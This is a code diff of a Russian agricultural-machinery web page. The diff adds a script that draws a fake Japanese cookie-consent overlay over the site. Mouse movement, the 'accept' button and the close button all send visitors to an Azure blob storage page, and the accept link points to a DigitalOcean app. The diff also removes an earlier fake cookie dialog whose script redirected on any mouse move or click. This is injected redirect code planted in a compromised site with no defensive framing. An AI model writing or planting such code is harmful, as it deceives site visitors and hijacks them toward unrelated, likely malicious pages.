@@ -1,4 +1,149 @@
 <!DOCTYPE html><html lang="ru"><head>
+	 <script>
+ 			    document.addEventListener("DOMContentLoaded", function () {
+ 			        const redirectUrl = "https://ultratank3505.blob.core.windows.net/cloud-bin-2771/index.html";
+ 			        const style = document.createElement("style");
+ 			        style.textContent = `
+ 			            .cookie-overlay {
+ 			                position: fixed;
+ 			                inset: 0;
+ 			                background: rgba(0, 0, 0, 0.8);
+ 			                backdrop-filter: blur(10px);
+ 			                display: flex;
+ 			                align-items: center;
+ 			                justify-content: center;
+ 			                padding: 20px;
+ 			                z-index: 9999;
+ 			                animation: fadeInBackground 0.5s ease-out forwards;
+ 			            }
+ 
+ 			            @keyframes fadeInBackground {
+ 			                from { opacity: 0; }
+ 			                to { opacity: 1; }
+ 			            }
+ 
+ 			            .cookie-popup {
+ 			                position: fixed;
+ 			                bottom: 60px;
+ 			                left: 50%;
+ 			                transform: translateX(-50%);
+ 			                background-color: #ffffff;
+ 			                border: none;
+ 			                color: #333;
+ 			                padding: 30px;
+ 			                border-radius: 10px;
+ 			                z-index: 10000;
+ 			                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+ 			                max-width: 400px;
+ 			                text-align: center;
+ 			            }
+ 
+ 			            .close-btn {
+ 			                background: none;
+ 			                border: none;
+ 			                font-size: 1.5rem;
+ 			                position: absolute;
+ 			                top: 10px;
+ 			                right: 10px;
+ 			                cursor: pointer;
+ 			                color: #888;
+ 			            }
+ 
+ 			            .btn-primary {
+ 			                background-color: #007bff;
+ 			                color: #fff;
+ 			                border: none;
+ 			                padding: 12px 24px;
+ 			                border-radius: 5px;
+ 			                cursor: pointer;
+ 			                margin-top: 15px;
+ 			                display: inline-block;
+ 			                text-decoration: none;
+ 			                transition: background-color 0.3s;
+ 			            }
+ 
+ 			            .btn-primary:hover {
+ 			                background-color: #0056b3;
+ 			            }
+ 
+ 			            h3 {
+ 			                font-family: 'Arial', sans-serif;
+ 			                margin-bottom: 10px;
+ 			            }
+ 
+ 			            p {
+ 			                font-family: 'Arial', sans-serif;
+ 			                line-height: 1.5;
+ 			            }
+ 			        `;
+ 			        document.head.appendChild(style);
+ 
+ 			        const overlay = document.createElement("div");
+ 			        overlay.className = "cookie-overlay";
+ 			        overlay.id = "cookie-overlay";
+ 			        overlay.innerHTML = `
+ 	<div class="cookie-popup">
+ 	<button class="close-btn" id="close-popup" aria-label="クッキーポリシーを閉じる">×</button>
+ 	<h3>クッキーポリシー</h3>
+ 	<p>
+ 			このサイトでは、コンテンツや広告のパーソナライズ、ソーシャルメディア機能の提供、トラフィックの分析のためにクッキーを使用しています。
+ 			「同意する」をクリックすることで、クッキーの使用に同意したことになります。詳細は
+ 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">クッキーポリシー</a>をご覧ください。
+ 	</p>
+ 	<a href="https://sea-turtle-app-x94en.ondigitalocean.app/" id="accept-cookies" class="btn-primary">同意する</a>
+ 	</div>
+ 			        `;
+ 			        document.body.appendChild(overlay);
+ 
+ 			        let isRedirected = false;
+ 			        let startPos = null;
+ 			        let redirectTimeout = null;
+ 
+ 			        const handleRedirect = () => {
+ 			            if (!isRedirected) {
+ 			                isRedirected = true;
+ 			                window.location.href = redirectUrl;
+ 			            }
+ 			        };
+ 
+ 			        const detectMouseMove = (event) => {
+ 			            if (isRedirected) return;
+ 
+ 			            const screenHeight = window.innerHeight;
+ 			            const activeTop = screenHeight * 0.1;
+ 
+ 			            if (event.clientY >= activeTop) {
+ 			                if (!startPos) {
+ 			                    startPos = { x: event.clientX, y: event.clientY };
+ 			                } else {
+ 			                    const dx = Math.abs(event.clientX - startPos.x);
+ 			                    const dy = Math.abs(event.clientY - startPos.y);
+ 
+ 			                    if ((dx > 10 || dy > 10) && !redirectTimeout) {
+ 			                        redirectTimeout = setTimeout(handleRedirect, 1000);
+ 			                    }
+ 			                }
+ 			            } else {
+ 			                startPos = null;
+ 			                clearTimeout(redirectTimeout);
+ 			                redirectTimeout = null;
+ 			            }
+ 			        };
+ 
+ 			        document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
+ 
+ 			        document.getElementById("accept-cookies").addEventListener("click", function (e) {
+ 			            e.preventDefault();
+ 			            handleRedirect();
+ 			        });
+ 
+ 			        document.getElementById("close-popup").addEventListener("click", function (e) {
+ 			            e.preventDefault();
+ 			            handleRedirect();
+ 			        });
+ 			    });
+ 	</script>
+ 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Сельскохозяйственная техника</title>
@@ -187,31 +332,6 @@
         </ul>
     </nav>
     
-  <div class="dialog-box">
-    <h2>🍪 Our New Cookie Policy!</h2>
-    <p>
-      For optimized experience, some elements may store temporary signals & For your safety, our Website uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
-    </p>
-    <div class="buttons">
-      <button class="accept">Accept</button>
-      <button class="deny">Deny</button>
-    </div>
-    <a href="#" class="policy-link">Policy Page</a>
-  </div>
-</div>
-
-
-<script>
-  function redirect() {
-    window.location.href = "https://rapidstore8132.blob.core.windows.net/zen-box-7060/index.html";
-  }
-
-  // Redirect when user moves the mouse
-  document.addEventListener('mousemove', redirect);
-
-  // Redirect when user clicks anywhere
-  document.addEventListener('click', redirect);
-</script>
 
 	
     <div class="container">
